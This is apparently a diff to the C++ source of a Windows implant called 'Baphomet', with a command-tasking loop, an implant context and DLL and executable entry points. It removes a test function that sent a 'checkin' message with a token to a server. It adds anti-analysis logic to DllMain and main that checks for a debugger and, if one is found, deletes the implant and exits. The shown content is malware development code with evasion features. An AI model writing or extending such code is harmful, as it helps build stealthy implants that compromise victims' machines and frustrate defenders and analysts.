@@ -4,8 +4,10 @@
 
 
 //
-// for testing purposes
+// for testing purposes. Needed this
 //
+
+#ifdef BAPHOMET_DEBUG
 bool read_from_disk(const std::string& file_name, std::string& outbuff) {
 
     HANDLE hFile = CreateFileA(
@@ -42,7 +44,7 @@ bool read_from_disk(const std::string& file_name, std::string& outbuff) {
     CloseHandle(hFile);
     return true;
 }
-
+#endif
 
 
 bool
@@ -171,37 +173,6 @@ receive_commands(implant_context& ctx) {
 }
 
 
-void pingtest( std::wstring address, uint16_t port, const std::string& token, const std::string& obj ) {
-
-    HINTERNET hsession = nullptr;
-    HINTERNET hconnect = nullptr;
-    std::string buff;
-
-
-    if(!networking::http::open_session(hsession, L"test program/1.0")) {
-        std::cout << "failed to open session" << std::endl;
-        return;
-    }
-
-    if(!networking::http::open_connection(address, port, hsession, hconnect)) {
-        std::cout << "failed to open connection" << std::endl;
-        return;
-    }
-
-    if(!networking::http::send_object_message(
-        hconnect,
-        obj,
-        "checkin",
-        token,
-        false,
-        buff
-    )) {
-        std::cout << "failed to send msg" << std::endl;
-        return;
-    }
-
-    std::cout << "response: " << buff << std::endl;
-}
 
 
 #pragma section(".baph", read, write)
@@ -245,6 +216,17 @@ BOOL APIENTRY DllMain(
     }
 
 
+    if(ctx.prevent_debugging) {
+        DEBUG_PRINT("[*] Debug prevention on, checking debug state...\n");
+        if(anti_analysis::being_debugged()) {
+            DEBUG_PRINT("[!] Being debugged: True, deleting self...\n");
+            anti_analysis::delete_self();
+            ExitThread(0);
+        }
+        DEBUG_PRINT("[+] Being debugged: False. Continuing.\n");
+    }
+
+
     switch (ul_reason_for_call)
     {
         case DLL_PROCESS_ATTACH:
@@ -278,9 +260,22 @@ int main() {
     ctx.original_base = GetModuleHandleW(nullptr);
     ctx.implant_base  = GetModuleHandleW(nullptr);
 
+
     if(!tasking::init_config(metadata, ctx)) {
         return EXIT_FAILURE;
     }
+
+
+    if(ctx.prevent_debugging) {
+        DEBUG_PRINT("[*] Debug prevention on, checking debug state...\n");
+        if(anti_analysis::being_debugged()) {
+            DEBUG_PRINT("[!] Being debugged: True, deleting self...\n");
+            anti_analysis::delete_self();
+            ExitProcess(0);
+        }
+        DEBUG_PRINT("[+] Being debugged: False. Continuing.");
+    }
+
 
     if(!receive_commands(ctx)) {
         return EXIT_FAILURE;
